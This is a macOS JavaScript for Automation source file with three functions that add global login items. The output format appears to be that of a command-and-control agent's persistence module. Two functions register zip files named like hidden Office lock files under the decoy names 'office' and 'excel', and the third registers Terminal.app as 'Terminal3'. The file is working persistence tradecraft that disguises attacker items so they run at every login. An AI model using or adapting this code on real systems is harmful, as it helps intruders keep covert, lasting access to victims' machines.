function BashloginItem(){
    ObjC.import('CoreServices');
    ObjC.import('Security');
    ObjC.import('SystemConfiguration');
    args = '/Users/<username>/~$sheet.zip';
	let auth;
    let iconRef = $.nil;
    let fref = $.nil;
    let result = $.AuthorizationCreate($.nil, $.nil, $.kAuthorizationDefaults, Ref(auth));

    if (result === 0) {
        let temp = $.CFURLCreateFromFileSystemRepresentation($.kCFAllocatorDefault,args,args.length, false);
		let items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListGlobalLoginItems, $.nil);
        $.LSSharedFileListSetAuthorization(items, auth);
        let cfName = $.CFStringCreateWithCString($.nil,'office', $.kCFStringEncodingASCII);
        let itemRef = $.LSSharedFileListInsertItemURL(items, $.kLSSharedFileListItemLast, cfName, $.nil, temp, $.nil, $.nil);
        return {"user_output": "LoginItem installation successful", "completed": true};
    } else {
        return {"user_output": `LoginItem installation failed: AuthorizationCreate returned ${result}`, "completed": true};
    }

};
function ZshloginItem(){
    ObjC.import('CoreServices');
    ObjC.import('Security');
    ObjC.import('SystemConfiguration');
    args = '/Users/<username>/~$sheet1.zip';
	let auth;
    let iconRef = $.nil;
    let fref = $.nil;
    let result = $.AuthorizationCreate($.nil, $.nil, $.kAuthorizationDefaults, Ref(auth));

    if (result === 0) {
        let temp = $.CFURLCreateFromFileSystemRepresentation($.kCFAllocatorDefault,args,args.length, false);
		let items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListGlobalLoginItems, $.nil);
        $.LSSharedFileListSetAuthorization(items, auth);
        let cfName = $.CFStringCreateWithCString($.nil,'excel', $.kCFStringEncodingASCII);
        let itemRef = $.LSSharedFileListInsertItemURL(items, $.kLSSharedFileListItemLast, cfName, $.nil, temp, $.nil, $.nil);
        return {"user_output": "LoginItem installation successful", "completed": true};
    } else {
        return {"user_output": `LoginItem installation failed: AuthorizationCreate returned ${result}`, "completed": true};
    }

};
function TerminalLoginItem(){
    ObjC.import('CoreServices');
    ObjC.import('Security');
    ObjC.import('SystemConfiguration');
    args = '/System/Applications/Utilities/Terminal.app';
	let auth;
    let iconRef = $.nil;
    let fref = $.nil;
    let result = $.AuthorizationCreate($.nil, $.nil, $.kAuthorizationDefaults, Ref(auth));

    if (result === 0) {
        let temp = $.CFURLCreateFromFileSystemRepresentation($.kCFAllocatorDefault,args,args.length, false);
		let items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListGlobalLoginItems, $.nil);
        $.LSSharedFileListSetAuthorization(items, auth);
        let cfName = $.CFStringCreateWithCString($.nil,'Terminal3', $.kCFStringEncodingASCII);
        let itemRef = $.LSSharedFileListInsertItemURL(items, $.kLSSharedFileListItemLast, cfName, $.nil, temp, $.nil, $.nil);
        return {"user_output": "LoginItem installation successful", "completed": true};
    } else {
        return {"user_output": `LoginItem installation failed: AuthorizationCreate returned ${result}`, "completed": true};
    }

};
